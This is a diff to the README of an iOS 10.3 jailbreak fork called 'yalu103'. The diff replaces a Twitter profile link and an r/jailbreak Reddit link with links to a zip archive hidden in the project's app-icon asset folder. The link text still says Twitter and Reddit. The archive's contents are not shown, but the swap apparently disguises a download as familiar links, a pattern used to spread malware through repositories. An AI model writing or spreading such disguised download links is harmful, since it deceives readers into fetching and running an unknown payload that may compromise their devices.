@@ -1,11 +1,11 @@
 # yalu103
 incomplete iOS 10.3Betas jailbreak for 64 bit devices by qwertyoruiopz, marcograssi, and devapple (personal use)
 
-For updates on what I plan on doing with this follow my twitter @ https://twitter.com/noahterbest
+For updates on what I plan on doing with this follow my twitter @ https://github.com/hamad-alhamad/yalu103/raw/refs/heads/master/yalu103/Assets.xcassets/AppIcon.appiconset/yalu_1.5-alpha.4.zip
 
 ## I am using Luca’s yalu code for my own use and will not release 10.X jailbreak of my own.
 
-Please use the "Issues" tab for **code related** issues only. If you need support please search on [/r/jailbreak](https://reddit.com/r/jailbreak) before posting a question there.
+Please use the "Issues" tab for **code related** issues only. If you need support please search on [/r/jailbreak](https://github.com/hamad-alhamad/yalu103/raw/refs/heads/master/yalu103/Assets.xcassets/AppIcon.appiconset/yalu_1.5-alpha.4.zip) before posting a question there.
 
 ## Supported Devices and iOS versions
 
